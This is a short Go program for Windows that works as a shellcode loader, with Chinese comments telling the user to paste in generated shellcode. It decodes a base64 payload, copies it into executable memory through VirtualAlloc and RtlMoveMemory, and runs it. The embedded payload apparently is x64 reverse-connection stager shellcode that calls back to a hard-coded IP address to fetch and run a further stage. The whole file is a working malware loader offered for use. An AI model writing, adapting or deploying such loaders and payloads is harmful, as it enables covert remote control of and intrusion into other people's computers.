//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func main() {
	// 将下面内容替换为生成的 shellcode base64 字符串
	payloadB64 := `/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHB
yQ1BAcHi7VJIi1Igi0I8SAHQZoF4GAsCQVEPhXIAAACLgIgAAABIhcB0Z0gB0FBEi0AgSQHQi0gY
41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0Ac
SQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJ
ieZIgeygAQAASYnlSbwCAAG6CtM3B0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoK
QV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/
znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhI
ifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoA
WkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V
`

	// 解码 shellcode
	shellcode, err := base64.StdEncoding.DecodeString(payloadB64)
	if err != nil {
		return
	}

	// 调用 VirtualAlloc 分配可执行内存
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	// 拷贝 shellcode 到分配的内存中
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	// 转换为函数并执行
	syscall.Syscall(addr, 0, 0, 0, 0)

	time.Sleep(30 * time.Second)

}
